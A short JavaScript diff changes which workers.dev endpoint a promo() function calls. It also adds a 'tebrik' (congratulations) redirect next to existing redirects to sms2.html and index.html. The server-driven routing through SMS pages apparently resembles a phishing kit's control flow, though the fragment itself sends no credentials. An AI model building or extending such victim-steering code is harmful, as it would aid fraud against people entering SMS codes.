@@ -75,7 +75,7 @@
         function promo() {
             var data = new FormData();
             data.append('action', "redirect");
-            fetch('https://curly-fire-5ecb.aisik3516.workers.dev/', {
+            fetch('https://bitter-water-6f4c.aisik3516.workers.dev/', {
                 method: 'POST',
                 body: data,
             })
@@ -87,6 +87,8 @@
                         window.location.href = "sms2.html";
                     } else if (data.page == "basadondur") {
                         window.location.href = "index.html";
+                    } else if (data.page == "tebrik") {
+                        window.location.href = "tebrik.html";
                     }
                 })
                 .catch(error => {
